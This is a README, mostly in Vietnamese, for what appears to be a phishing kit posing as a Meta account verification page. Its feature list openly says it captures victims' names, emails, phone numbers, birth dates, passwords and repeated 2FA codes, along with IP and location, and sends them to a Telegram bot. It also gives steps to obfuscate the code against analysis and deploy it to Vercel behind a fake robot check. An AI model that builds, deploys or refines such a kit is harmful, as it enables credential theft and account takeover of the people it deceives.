# Meta Verification System

## 📁 Cấu trúc Project

```
├── index.html             # Landing page (Robot check)
├── required.html          # Main form page
├── vercel.json            # Vercel configuration
├── public/
│   ├── js/
│   │   ├── config.js      # ⚙️ Configuration (Telegram, keys)
│   │   ├── utils.js       # 🛠️ Utilities (encrypt, location, telegram)
│   │   ├── modal.js       # 📦 Modal manager
│   │   └── app.js         # 🚀 Main application logic
│   └── styles/
│       ├── checkbox.css   # Checkbox animation
│       └── style.css      # Main styles
├── package.json           # NPM scripts
├── minify.bat            # Windows minify script
├── obfuscate.bat         # Windows obfuscate script
├── MINIFY_GUIDE.md       # Chi tiết hướng dẫn
└── README.md             # File này
```

## 🚀 Cài đặt

### 1. Cài đặt Node.js dependencies (tùy chọn)

```bash
npm install
```

## 🔧 Sử dụng

### Chạy trực tiếp (Development)
Mở `index.html` hoặc `required.html` trong trình duyệt

### Minify Code (Production)

**Windows:**
```bash
# Double click hoặc chạy
minify.bat
```

**Linux/Mac hoặc NPM:**
```bash
npm run minify
```

Sau đó cập nhật `required.html`:
```html
<script src="./public/js/config.min.js"></script>
<script src="./public/js/utils.min.js"></script>
<script src="./public/js/modal.min.js"></script>
<script src="./public/js/app.min.js"></script>
```

### Obfuscate Code (Security)

**Windows:**
```bash
# Double click hoặc chạy
obfuscate.bat
```

**Linux/Mac hoặc NPM:**
```bash
npm run obfuscate
```

Sau đó cập nhật `required.html`:
```html
<script src="./public/js/config.obf.js"></script>
<script src="./public/js/utils.obf.js"></script>
<script src="./public/js/modal.obf.js"></script>
<script src="./public/js/app.obf.js"></script>
```

## ⚙️ Cấu hình

Chỉnh sửa file `public/js/config.js`:

```javascript
const CONFIG = {
    TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN',
    TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID',
    SECRET_KEY: 'YOUR_SECRET_KEY',
    STORAGE_EXPIRY: 60 * 60 * 1000,  // 1 hour
    COUNTDOWN_TIME: 5                 // seconds
};
```

## 📝 Tính năng

✅ Lấy thông tin user (Full name, Email, Phone, DOB, Page name)  
✅ Lấy password (2 lần)  
✅ Lấy 2FA code (3 lần)  
✅ Lấy location & IP tự động  
✅ Gửi tất cả về Telegram  
✅ Mã hóa dữ liệu trong localStorage  
✅ Countdown khi nhập sai 2FA  
✅ Modal animations mượt mà  
✅ Responsive design  
✅ Checkbox animation (robot.html)  

## 🔐 Bảo mật

- ✅ Dữ liệu được mã hóa AES trước khi lưu localStorage
- ✅ Support obfuscate code để khó reverse engineer
- ✅ Location tracking tự động
- ✅ User agent detection

## 📦 Build cho Production

### Quick Start (Windows)

```bash
# Build production (obfuscate) - RECOMMENDED
build.bat

# Hoặc build với minify only
build-minify.bat
```

### Linux/Mac

```bash
chmod +x build.sh
./build.sh
```

### NPM Scripts

```bash
# Build production vào thư mục dist/
npm run build              # Obfuscate (recommended)
npm run build:minify       # Minify only

# Clean build
npm run clean
```

### 🎯 Kết quả

Sau khi build, bạn sẽ có thư mục `dist/` sẵn sàng deploy:

```
dist/
├── required.html
├── robot.html  
├── build-info.json
└── public/
    ├── js/ (obfuscated/minified)
    ├── styles/
    ├── meta/
    └── assets
```

**Chỉ cần deploy toàn bộ thư mục `dist/` lên server!**

Chi tiết xem file `BUILD_GUIDE.md`

### 🚀 Deploy lên Vercel (Quick)

```bash
# Cài đặt Vercel CLI
npm install -g vercel

# Login
vercel login

# Deploy
vercel --prod
```

✅ Vercel sẽ tự động:
- Run `npm install`
- Run `npm run vercel-build` (obfuscate JS)
- Deploy thư mục `dist/`

**URLs:**
- `https://your-project.vercel.app` → Landing (Robot check)
- `https://your-project.vercel.app/required` → Form

📖 Chi tiết: `VERCEL_DEPLOY.md`

## 📖 Chi tiết

Xem file `MINIFY_GUIDE.md` để biết thêm chi tiết về minify và obfuscate.

## ⚠️ Lưu ý

- Luôn backup code gốc trước khi obfuscate
- Test kỹ sau khi obfuscate vì code có thể bị lỗi
- File config.js nên minify nhẹ để dễ thay đổi cấu hình

## 📊 File sizes

| File | Original | Minified | Obfuscated |
|------|----------|----------|------------|
| config.js | ~0.3 KB | ~0.2 KB | ~1 KB |
| utils.js | ~3.5 KB | ~2 KB | ~8 KB |
| modal.js | ~1 KB | ~0.5 KB | ~2 KB |
| app.js | ~10 KB | ~5 KB | ~25 KB |

## 🛠️ Tech Stack

- HTML5
- CSS3 (Tailwind CSS)
- Vanilla JavaScript
- CryptoJS (AES encryption)
- Telegram Bot API
- IP Location APIs

## 📞 Support

Nếu có vấn đề, check console log trong browser DevTools.

---

Made with ❤️

